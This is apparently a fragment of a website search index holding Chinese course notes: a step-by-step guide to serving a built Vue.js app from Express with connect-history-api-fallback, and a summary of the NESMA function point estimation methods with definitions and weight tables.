\u4f7f\u7528Express\u90e8\u7f72Vue\u9879\u76ee","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/2.%E4%BD%BF%E7%94%A8Express%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/#1","text":"\u6211\u4eec\u60f3\u8981\u505a\u4e00\u4e2a\u524d\u540e\u7aef\u5206\u79bb\u7684\u8bfe\u7a0b\u9879\u76ee\uff0c\u524d\u7aef\u6846\u67b6\u51c6\u5907\u4f7f\u7528 Vue.js \uff0c\u5e76\u4f7f\u7528 Express \u4f5c\u4e3a Node.js \u4e2d\u95f4\u4ef6\u8fdb\u884c\u90e8\u7f72\uff0c\u540e\u7aef\u4f7f\u7528 Java Servlet \u4e0e\u6570\u636e\u5e93\u4ea4\u4e92\u3002 \u4f46\u6211\u5728\u5c1d\u8bd5\u6839\u636e\u7f51\u7edc\u4e0a\u7684\u4e00\u4e9b\u6559\u7a0b\u5c06 Vue.js \u6784\u5efa\u597d\u7684\u9879\u76ee\u90e8\u7f72\u5230 Express \u4e0a\u65f6\uff0c\u53d1\u73b0\u9875\u9762\u603b\u662f\u663e\u793a\u4e0d\u51fa\u6765\uff0cHTML\u91cc\u7684\u63d0\u793a\u662f We're sorry but hello-world doesn't work properly without JavaScript enabled. Please enable it to continue. \u6240\u4ee5\u6211\u5c1d\u8bd5\u5728 Vue CLI\u7684\u5b98\u7f51 \u5bfb\u627e\u90e8\u7f72\u65b9\u6848\u3002\u53d1\u73b0 \u5b98\u65b9\u63a8\u8350\u7684\u90e8\u7f72\u5728Express\u4e0a\u7684\u65b9\u6848 \u662f\u4f7f\u7528 connect-history-api-fallback \u4e2d\u95f4\u4ef6 \u3002\u4e8e\u662f\u6211\u628a\u5177\u4f53\u7684\u90e8\u7f72\u6d41\u7a0b\u5199\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/2.%E4%BD%BF%E7%94%A8Express%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/#2-vue-cli","text":"\u6b64\u90e8\u5206\u53c2\u8003\u81ea Vue CLI \u5b98\u65b9\u6587\u6863","title":"2. \u914d\u7f6eVue CLI"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/2.%E4%BD%BF%E7%94%A8Express%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/#21-nodejs","text":"\u524d\u5f80\u5b98\u7f51 https://nodejs.org/en/download/ \u8fdb\u884c\u4e0b\u8f7d\uff0c\u56fe\u5f62\u754c\u9762\u5b89\u88c5\uff0c\u6309\u7167\u63d0\u793a\u8fdb\u884c\u5373\u53ef Mac OS\u4e5f\u53ef\u4ee5\u7528brew\u5b89\u88c5 brew install node","title":"2.1. \u5b89\u88c5Node.js"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/2.%E4%BD%BF%E7%94%A8Express%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/#22-vue-cli","text":"npm install -g @vue/cli # OR yarn global add @vue/cli \u67e5\u770b\u662f\u5426\u5b89\u88c5\u6210\u529f vue --version","title":"2.2. \u5b89\u88c5Vue CLI"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/2.%E4%BD%BF%E7%94%A8Express%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/#23-vue","text":"\u547d\u4ee4\u884c\u8fdb\u5165\u4e00\u4e2a\u4f60\u60f3\u5b89\u88c5\u7684\u6587\u4ef6\u5939\uff0c\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4 vue create hello-world \u4f60\u4f1a\u88ab\u63d0\u793a\u9009\u53d6\u4e00\u4e2a preset\u3002\u4f60\u53ef\u4ee5\u9009\u9ed8\u8ba4\u7684\u5305\u542b\u4e86\u57fa\u672c\u7684 Babel + ESLint \u8bbe\u7f6e\u7684 preset\uff0c\u4e5f\u53ef\u4ee5\u9009\u201c\u624b\u52a8\u9009\u62e9\u7279\u6027\u201d\u6765\u9009\u53d6\u9700\u8981\u7684\u7279\u6027\u3002 \\text{Figure 1. CLI new project} \u8fd9\u4e2a\u9ed8\u8ba4\u7684\u8bbe\u7f6e\u975e\u5e38\u9002\u5408\u5feb\u901f\u521b\u5efa\u4e00\u4e2a\u65b0\u9879\u76ee\u7684\u539f\u578b\uff0c\u800c\u624b\u52a8\u8bbe\u7f6e\u5219\u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u9009\u9879\uff0c\u5b83\u4eec\u662f\u9762\u5411\u751f\u4ea7\u7684\u9879\u76ee\u66f4\u52a0\u9700\u8981\u7684\u3002 \\text{Figure 2. CLI select features} \u8fd0\u884c\u9879\u76ee cd hello-world npm run serve \\text{Figure 3. Npm run serve} \u8bbf\u95ee\u663e\u793a\u7684url\u4f1a\u51fa\u73b0Vue\u7684\u6b22\u8fce\u754c\u9762 \\text{Figure 4. Web index}","title":"2.3. \u521b\u5efaVue\u9879\u76ee"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/2.%E4%BD%BF%E7%94%A8Express%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/#24-vue","text":"\u901a\u8fc7 Ctrl-C \u505c\u6b62\u8fd0\u884c\u540e\uff0c\u6784\u5efa\u9879\u76ee\u3002\u6253\u5305\u597d\u7684\u6587\u4ef6\u4f1a\u5b58\u653e\u5728dist\u6587\u4ef6\u5939\u4e0b\u3002 npm run build \u4f46\u662fdist\u6587\u4ef6\u5939\u4e0b\u7684 index.html \u6211\u4eec\u901a\u8fc7\u672c\u5730\u6d4f\u89c8\u5668\u662f\u6253\u4e0d\u5f00\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u4e2a Node.js \u670d\u52a1\u5668\uff0c\u6211\u4f7f\u7528\u7684\u662f Express \u3002\u4e0b\u9762\u5c31\u8fdb\u5165 Express \u7684\u914d\u7f6e\u3002","title":"2.4. \u6784\u5efaVue\u9879\u76ee"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/2.%E4%BD%BF%E7%94%A8Express%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/#3-express","text":"\u6b64\u90e8\u5206\u5185\u5bb9\u53c2\u8003\u81ea Express\u5b98\u65b9\u6587\u6863 \u3002","title":"3. \u914d\u7f6eExpress"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/2.%E4%BD%BF%E7%94%A8Express%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/#31-express","text":"\u9996\u5148\u9000\u51fa\u521a\u624d\u521b\u5efa\u7684Vue\u9879\u76ee\u6587\u4ef6\u5939 cd .. \u7136\u540e\u521b\u5efaExpress\u6587\u4ef6\u5939\u5e76\u8fdb\u5165\u5176\u4e2d mkdir myapp cd myapp \u901a\u8fc7 npm init \u547d\u4ee4\u4e3a\u4f60\u7684\u5e94\u7528\u521b\u5efa\u4e00\u4e2a package.json \u6587\u4ef6\u3002 npm init \u6b64\u547d\u4ee4\u5c06\u8981\u6c42\u4f60\u8f93\u5165\u51e0\u4e2a\u53c2\u6570\uff0c\u4f8b\u5982\u6b64\u5e94\u7528\u7684\u540d\u79f0\u548c\u7248\u672c\u3002 \u4f60\u53ef\u4ee5\u76f4\u63a5\u6309\u201c\u56de\u8f66\u201d\u952e\u63a5\u53d7\u5927\u90e8\u5206\u9ed8\u8ba4\u8bbe\u7f6e\u5373\u53ef\uff0c\u4e0b\u9762\u8fd9\u4e2a\u9664\u5916\uff1a entry point: (index.js) \u952e\u5165 app.js \u6216\u8005\u4f60\u6240\u5e0c\u671b\u7684\u540d\u79f0\uff0c\u8fd9\u662f\u5f53\u524d\u5e94\u7528\u7684\u5165\u53e3\u6587\u4ef6\u3002\u5982\u679c\u4f60\u5e0c\u671b\u91c7\u7528\u9ed8\u8ba4\u7684 index.js \u6587\u4ef6\u540d\uff0c\u53ea\u9700\u6309\u201c\u56de\u8f66\u201d\u952e\u5373\u53ef\u3002 \u63a5\u4e0b\u6765\u5728 myapp \u76ee\u5f55\u4e0b\u5b89\u88c5 Express \u5e76\u5c06\u5176\u4fdd\u5b58\u5230\u4f9d\u8d56\u5217\u8868\u4e2d\u3002\u5982\u4e0b\uff1a npm install express --save","title":"3.1. \u5b89\u88c5Express"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/2.%E4%BD%BF%E7%94%A8Express%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/#32","text":"\u901a\u8fc7\u5e94\u7528\u751f\u6210\u5668\u5de5\u5177 express-generator \u53ef\u4ee5\u5feb\u901f\u521b\u5efa\u4e00\u4e2a\u5e94\u7528\u7684\u9aa8\u67b6\u3002 npx express-generator \u5bf9\u4e8e\u8f83\u8001\u7684 Node \u7248\u672c\uff0c\u8bf7\u901a\u8fc7 npm \u5c06 Express \u5e94\u7528\u7a0b\u5e8f\u751f\u6210\u5668\u5b89\u88c5\u5230\u5168\u5c40\u73af\u5883\u4e2d\u5e76\u6267\u884c\u5373\u53ef\u3002 npm install -g express-generator express \u5b89\u88c5\u65f6\u4f1a\u63d0\u793a\u6587\u4ef6\u5939\u975e\u7a7a\uff0c\u662f\u5426\u786e\u5b9a\u5b89\u88c5\uff0c\u8f93\u5165y\u7136\u540e\u56de\u8f66\u5373\u53ef \\text{Figure 5. Express generator} \u7136\u540e\u5b89\u88c5\u6240\u6709\u4f9d\u8d56\u5305\uff1a npm install \u5728 MacOS \u6216 Linux \u4e2d\uff0c\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u542f\u52a8\u6b64\u5e94\u7528\uff1a DEBUG=myapp:* npm start \u5728 Windows \u4e2d\uff0c\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u542f\u52a8\u6b64\u5e94\u7528\uff1a set DEBUG=myapp:* & npm start \u7136\u540e\u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00 http://localhost:3000/ \u7f51\u5740\u5c31\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u5e94\u7528\u4e86\u3002 \\text{Figure 6. Express index} \u540c\u6837\u4f7f\u7528 Ctrl-C \u505c\u6b62\u8fd0\u884c\uff0c\u4e0b\u9762\u5c06Vue\u9879\u76ee\u6784\u5efa\u7684\u6587\u4ef6\u90e8\u7f72\u5230Express\u3002","title":"3.2. \u521b\u5efa\u9879\u76ee"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/2.%E4%BD%BF%E7%94%A8Express%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE/#4-expressvue","text":"\u5c06Vue\u9879\u76ee hello-world \u76ee\u5f55\u4e2d\u7684dist\u6587\u4ef6\u5939\u590d\u5236\u5230 Express\u9879\u76ee myapp \u6587\u4ef6\u5939\u3002 \u76f4\u63a5\u590d\u5236\u8fc7\u53bb\u4e5f\u53ef\u4ee5\uff0c\u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u884c\u590d\u5236\u4e5f\u53ef\u4ee5\u3002 mkdir dist cp -a ../hello-world/dist/ ./dist \u590d\u5236\u5b8c\u6210\u540e\uff0cmyapp\u6587\u4ef6\u5939\u7684\u76ee\u5f55\u6811\u5e94\u8be5\u662f\u8fd9\u6837\u7684 xxx/myapp \u251c\u2500\u2500 app.js \u251c\u2500\u2500 bin \u251c\u2500\u2500 dist \u251c\u2500\u2500 node_modules \u251c\u2500\u2500 package-lock.json \u251c\u2500\u2500 package.json \u251c\u2500\u2500 public \u251c\u2500\u2500 routes \u2514\u2500\u2500 views \u5b89\u88c5 connect-history-api-fallback \u4e2d\u95f4\u4ef6 npm install --save connect-history-api-fallback \u5b89\u88c5\u5b8c\u6210\u4ee5\u540e\uff0c\u4fee\u6539app.js var createError = require('http-errors'); var express = require('express'); var path = require('path'); var cookieParser = require('cookie-parser'); var logger = require('morgan'); var indexRouter = require('./routes/index'); var usersRouter = require('./routes/users'); var app = express(); // view engine setup app.set('views', path.join(__dirname, 'views')); app.set('view engine', 'jade'); app.use(logger('dev')); app.use(express.json()); app.use(express.urlencoded({ extended: false })); app.use(cookieParser()); app.use(express.static(path.join(__dirname, 'public'))); // ----------------\u8fd9\u4e24\u884c\u88ab\u6211\u4eec\u6ce8\u91ca\u6389\u4e86----------- // app.use('/', indexRouter); // app.use('/users', usersRouter); //--------------------------------------------- // ----------------\u8fd9\u4e09\u884c\u662f\u6211\u4eec\u65b0\u6dfb\u52a0\u7684----------- var history = require('connect-history-api-fallback'); app.use(express.static(path.join(__dirname, 'dist'))); app.use(history()); //--------------------------------------------- // catch 404 and forward to error handler app.use(function(req, res, next) { next(createError(404)); }); // error handler app.use(function(err, req, res, next) { // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get('env') === 'development' ? err : {}; // render the error page res.status(err.status || 500); res.render('error'); }); module.exports = app; \u5728\u6211\u6807\u8bb0\u7684\u5730\u65b9\u52a0\u5165\u4e86\u4e0b\u97623\u6761\u8bed\u53e5\uff0c\u5c06\u4e2d\u95f4\u4ef6\u52a0\u5165\u4e86\u5176\u4e2d\u3002\u5e76\u4e14\u6ce8\u91ca\u6389\u4e86\u524d\u9762\u7684\u4e24\u6761\u8bed\u53e5\uff0c\u8ba9\u9875\u9762\u81ea\u52a8\u8bbf\u95ee index.html \u3002 // ----------------\u8fd9\u4e24\u884c\u88ab\u6211\u4eec\u6ce8\u91ca\u6389\u4e86----------- // app.use('/', indexRouter); // app.use('/users', usersRouter); //--------------------------------------------- // ----------------\u8fd9\u4e09\u884c\u662f\u6211\u4eec\u65b0\u6dfb\u52a0\u7684----------- var history = require('connect-history-api-fallback'); app.use(express.static(path.join(__dirname, 'dist'))); app.use(history()); //--------------------------------------------- \u542f\u52a8Express npm start \u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00 http://localhost:3000/ \uff0c\u770b\u5230Vue\u7684\u754c\u9762\u5c31\u5927\u529f\u544a\u6210\u4e86\u3002 \\text{Figure 7. Vue index\u5728Express\u4e2d\u663e\u793a\u6210\u529f} \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4. \u4f7f\u7528Express\u90e8\u7f72Vue\u9879\u76ee"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/","text":"NESMA\u529f\u80fd\u70b9\u4f30\u8ba1\u65b9\u6cd5 # \u76ee\u5f55 # NESMA\u529f\u80fd\u70b9\u4f30\u8ba1\u65b9\u6cd5 \u76ee\u5f55 1. \u80cc\u666f 2. \u6982\u8ff0 3. \u65b9\u6cd5\u5b9a\u4e49 3.1. Detailed FPA method 3.2. High Level FPA method 3.3. Indicative FPA method 4. \u6982\u5ff5\u5b9a\u4e49 4.1. \u5916\u90e8\u63a5\u53e3\u6587\u4ef6 (EIF External Interface File) 4.2. \u5185\u90e8\u903b\u8f91\u6587\u4ef6 (ILF Internal Logical File) 4.3. \u5916\u90e8\u67e5\u8be2(EQ External Inquiry) 4.4. \u5916\u90e8\u8f93\u5165(EI Extemal Input) 4.5. \u5916\u90e8\u8f93\u51fa (EO External Output) 5. \u529f\u80fd\u70b9\u6570\u53c2\u8003\u503c 6. \u4e3e\u4f8b 6.3. Indicative FPA method 6.2. High Level FPA method 6.1. Detailed FPA method 1. \u80cc\u666f # \u6700\u8fd1\u5728\u300a\u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1\u300b\u8bfe\u7a0b\u4e2d\u5b66\u4e60\u4e86\u529f\u80fd\u70b9\u4f30\u8ba1\u65b9\u6cd5\uff0c\u5728\u6b64\u8fdb\u884c\u603b\u7ed3\u3002 2. \u6982\u8ff0 # \u529f\u80fd\u70b9\u5206\u6790\u6cd5 FPA(Function Point Analysis) \u662f\u7531 IBM \u7684 \u5de5\u7a0b\u5e08 Alan JAlbrecht \u4e8e 2O\u4e16\u7eaa7O\u5e74\u4ee3\u672b\u63d0\u51fa\u7684 \uff0c\u662f\u4e00\u79cd\u4e0e\u7a0b\u5e8f\u8bed\u8a00\u65e0\u5173\uff0c\u80fd\u591f\u6709\u6548\u8861\u91cf\u8f6f\u4ef6\u89c4\u6a21\u7684\u65b9\u6cd5\u3002\u8377\u5170\u8f6f\u4ef6\u5ea6\u91cf\u534f\u4f1a ( Netherland Software Measurement Asociation )\u63a8\u51fa\u4e86 NESMA \u529f\u80fd\u70b9\uff0c\u90fd\u662f Albrech \u529f\u80fd\u70b9\u5206\u6790\u7406\u8bba\u7684\u53d1\u5c55\u548c\u7ec6\u5316\u3002 3. \u65b9\u6cd5\u5b9a\u4e49 # \u5728NESMA\u7684\u5b98\u65b9\u6587\u6863\u4e2d\u5bf9 NESMA \u529f\u80fd\u70b9\u4f30\u8ba1\u65b9\u6cd5\u8fdb\u884c\u4e86\u5b9a\u4e49\u3002 Nesma recognizes three function point analysis methods: Detailed FPA High Level FPA (also called Estimated FPA) Indicative FPA All these three methods are a self-contained Functional Size Measurement (FSM) method on their own. The high level FPA method and the indicative FPA method do not require detailed user requirements, while the functional size determined using these methods is very close to the functional size determined using the detailed FPA method. That\u2019s why these two methods are very suited to be applied early in de software development life cycle or in case the functional size needs to be determined fast. This document discusses these three methods, their accuracy and applicability. 3.1. Detailed FPA method # This is the usual function point analysis method and is performed as follows: determine all functions of all function types (ILF, EIF, EI, EO, EQ) rate the complexity of every function (Low, Average, High) calculate the total number of function points 3.2. High Level FPA method # The high level function point analysis method is performed as follows: determine all functions of all function types (ILF, EIF, EI, EO, EQ) rate the complexity of every data function (ILF, EIF) as Low, and of every transactional function (EI, EO, EQ) as Average calculate the total number of function points So, the only difference with the detailed function point analysis method is that the complexity is not determined per individual function, but by default. 3.3. Indicative FPA method # The indicative function point analysis method is performed as follows: Determine all data functions (ILF and EIF) Calculate the number of function points as follows: functional size (fp) = 35 x number of ILFs + 15 x number of EIFs So the functional size is based solely on the logical files (ILFs and EIFs). The indicative function point analysis method is based on the assumption that there will be about three EIs (to add, change, and delete information in the ILF), two EOs, and one EQ on average for every ILF, and about one EO and one EQ for every EIF. \u8bba\u6587\u300a\u57fa\u4e8eNESMA\u529f\u80fd\u70b9\u5206\u6790\u65b9\u6cd5\u300b\u4e2d\u5bf9 ILF \u548c EIF \u4e5f\u8fdb\u884c\u4e86\u5b9a\u4e49\u3002 4. \u6982\u5ff5\u5b9a\u4e49 # 4.1. \u5916\u90e8\u63a5\u53e3\u6587\u4ef6 (EIF External Interface File) # \u88ab\u4e00\u5e94\u7528\u7a0b\u5e8f\u5f15\u7528\u4f46\u5728\u53e6\u4e00\u5e94\u7528\u7a0b\u5e8f\u8fb9\u754c\u5185\u88ab\u7ef4\u62a4\u7684\uff0c\u7528\u6237\u53ef\u8bc6\u522b\u7684\u903b\u8f91\u76f8\u5173\u6570\u636e\u7ec4\u6216\u63a7\u5236\u4fe1\u606f\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u662f\u4fdd\u5b58\u7531\u88ab\u8ba1\u6570\u7684\u5e94\u7528\u7a0b\u5e8f\u8fb9\u754c\u5185\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u57fa\u672c\u5904\u7406\u6240\u5f15\u7528\u7684\u6570\u636e\u3002 4.2. \u5185\u90e8\u903b\u8f91\u6587\u4ef6 (ILF Internal Logical File) # \u5728\u5e94\u7528\u7a0b\u5e8f\u8fb9\u754c\u5185\u7ef4\u62a4\u7684\u7528\u6237\u53ef\u8bc6\u522b\u7684\u903b\u8f91\u76f8\u5173\u6570\u636e\u7ec4\u6216\u63a7\u5236\u4fe1\u606f\u3002\u5176\u4e3b\u8981\u76ee\u7684\u662f\u4fdd\u5b58\u7531\u88ab\u8ba1\u6570\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u57fa\u672c\u5904\u7406\u6240\u7ef4\u62a4\u7684\u6570\u636e\u3002 NESMA \u5b98\u65b9\u6587\u6863\u4e2d\u5bf9 ILF \u7684\u5b9a\u4e49\u3002 The definition of an ILF is: An internal logical file is a logical group of permanent data seen from the perspective of the user that meets each of the following criteria: It is used by the application to be counted It is maintained by the application to be counted The aforementioned entities meet the listed criteria: they are both used and maintained by the information system to be counted. However, the phrase, \"from the perspective of the user\" is crucial. The guideline states the following on this subject: \"... a group of data that an experienced user considers as a significant and useful unit or object. An equivalent to this kind of logical group of data is an object type in data modeling.\" For users, the four different types of taxes are also four different things. Taxes and the accompanying regulations are indeed mutually substantively totally different. The designer of the above model has wanted to connect to the different taxes and opted to accommodate four types of payments in four separate tables; these are largely similar in structure. Logically, however, they all concern one object type PAYMENT, of which one of the data element types could be: TaxType. For the valuation of the logical file the additional data element type will be counted and no additional record types are distinguished. In a situation like this it is recommended to adjust the functional design in order to avoid discrepancy between the count and the design. 4.3. \u5916\u90e8\u67e5\u8be2(EQ External Inquiry) # \u53d1\u9001\u6570\u636e\u6216\u63a7\u5236\u4fe1\u606f\u5230\u5e94\u7528\u7a0b\u5e8f\u8fb9\u754c\u5916\u7684\u4e00\u4e2a\u57fa\u672c\u5904\u7406\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u662f\u901a\u8fc7\u68c0\u7d22\u6765\u81ea\u5185\u90e8\u903b\u8f91\u6587\u4ef6\u6216\u5916\u90e8\u63a5\u53e3\u6587\u4ef6\u7684\u6570\u636e\u6216\u63a7\u5236\u4fe1\u606f\uff0c\u5411\u7528\u6237\u63d0\u4f9b\u4fe1\u606f\u3002\u5904\u7406\u903b\u8f91\u65e2\u4e0d\u5305\u542b\u6570\u5b66\u516c\u5f0f\u6216\u8ba1\u7b97\uff0c\u4e5f\u4e0d\u521b\u5efa\u65b0\u7684\u6570\u636e\u3002\u5904\u7406\u671f\u95f4\u4e0d\u7ef4\u62a4\u5185\u90e8\u903b\u8f91\u6587\u4ef6\uff0c\u4e5f\u4e0d\u6539\u53d8\u7cfb\u7edf\u884c\u4e3a\u3002 4.4. \u5916\u90e8\u8f93\u5165(EI Extemal Input) # \u6570\u636e\u6216\u63a7\u5236\u4fe1\u606f\u7531\u5916\u5411\u5185\u7a7f\u8d8a\u5e94\u7528\u7a0b\u5e8f\u8fb9\u754c\u7684\u4e00\u4e2a\u57fa\u672c\u5904\u7406\u8fc7\u7a0b\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u662f\u7ef4\u62a4\u4e00\u4e2a\u6216\u591a\u4e2a\u5185\u90e8\u903b\u8f91\u6587\u4ef6\u548c/\u6216\u6539\u53d8\u7cfb\u7edf\u884c\u4e3a\u3002 4.5. \u5916\u90e8\u8f93\u51fa (EO External Output) # \u53d1\u9001\u6570\u636e\u6216\u63a7\u5236\u4fe1\u606f\u5230\u5e94\u7528\u7a0b\u5e8f\u8fb9\u754c\u5916\u7684\u4e00\u4e2a\u57fa\u672c\u5904\u7406\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u662f\u901a\u8fc7\u68c0\u7d22\u6570\u636e\u6216\u63a7\u5236\u4fe1\u606f\uff0c\u6b64\u5916\u8fd8\u901a\u8fc7\u5904\u7406\u903b\u8f91\u6765\u5411\u7528\u6237\u63d0\u4f9b\u4fe1\u606f\uff0c\u5176\u5904\u7406\u903b\u8f91\u5fc5\u987b\u5305\u542b\u81f3\u5c11\u4e00\u4e2a\u6570\u5b66\u516c\u5f0f\u6216\u8ba1\u7b97\uff0c\u6216\u521b\u5efa\u6d3e\u751f\u7684\u6570\u636e\u3002\u4e00\u4e2a\u5916\u90e8\u8f93\u51fa\u4e5f\u53ef\u4ee5\u7ef4\u62a4\u4e00\u4e2a\u6216\u591a\u4e2a\u5185\u90e8\u903b\u8f91\u6587\u4ef6\uff0c\u548c/\u6216\u6539\u53d8\u7cfb\u7edf\u884c\u4e3a\u3002 \u5176\u4e2d : \u6570 \u636e \u7c7b \u578b : ILF\u3001 EIF \u4e8b\u52a1\u7c7b\u578b : El\u3001EO\u3001EQ 5. \u529f\u80fd\u70b9\u6570\u53c2\u8003\u503c # Complexity ILF EIF EI EO EQ Low 7 5 3 4 3 Average 10 7 4 5 4 High 15 10 6 7 5 6. \u4e3e\u4f8b # 6.3. Indicative FPA method # For an indicative function point analysis just information about the data functions is needed. User requirements: user wants to maintain Customer data and Product data, and to reference Supplier data This (rough) specification is enough for an indicative function point analysis: ILF: Customer and Product EIF: Supplier 6.2. High Level FPA method # To perform a high level function point analysis also information about the transactional functions is needed, so more detailed user requirements are necessary. User requirements: user wants to add, change, delete Customer data, wants to inquire on Customer, and also requires four different reports on Customer with calculated data user wants to add, change, delete Product data, wants to inquire on Product, and also requires a report on Product with calculated data user wants to inquire on Supplier using supplier number, and also requires a report on Supplier with totaling results This more detailed specification of functions, and therefore enables a the user requirements contains also the transactional high level function point analysis: 6.1. Detailed FPA method # To carry out a detailed function point analysis, one does not only need the number of functions of each function type (EI, EO, EQ, ILF, EIF), but one also needs to determine the functional complexity of each individual function (Low, Average, High). In a detailed FPA, the functional complexity of a (data or transactional) function is determined, based on the number of DETs, RETs and File Types Referenced that are relevant to this function. That's why the user requirements (as they were stated above when the high level function point analysis was discussed) need to be analyzed in more detail: which data elements (DETs) and logical files (File Types Referenced) are used by a transactional function (EI, EO, EQ), and which logical data groups (RETs) and data elements (DETs) a data function (ILF, EIF) consists of. This detailed analysis of the user requirements could result in the following (detailed) function point analysis: \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.NESMA\u529f\u80fd\u70b9\u4f30\u8ba1\u65b9\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#nesma","text":"","title":"NESMA\u529f\u80fd\u70b9\u4f30\u8ba1\u65b9\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#_1","text":"NESMA\u529f\u80fd\u70b9\u4f30\u8ba1\u65b9\u6cd5 \u76ee\u5f55 1. \u80cc\u666f 2. \u6982\u8ff0 3. \u65b9\u6cd5\u5b9a\u4e49 3.1. Detailed FPA method 3.2. High Level FPA method 3.3. Indicative FPA method 4. \u6982\u5ff5\u5b9a\u4e49 4.1. \u5916\u90e8\u63a5\u53e3\u6587\u4ef6 (EIF External Interface File) 4.2. \u5185\u90e8\u903b\u8f91\u6587\u4ef6 (ILF Internal Logical File) 4.3. \u5916\u90e8\u67e5\u8be2(EQ External Inquiry) 4.4. \u5916\u90e8\u8f93\u5165(EI Extemal Input) 4.5. \u5916\u90e8\u8f93\u51fa (EO External Output) 5. \u529f\u80fd\u70b9\u6570\u53c2\u8003\u503c 6. \u4e3e\u4f8b 6.3. Indicative FPA method 6.2. High Level FPA method 6.1. Detailed FPA 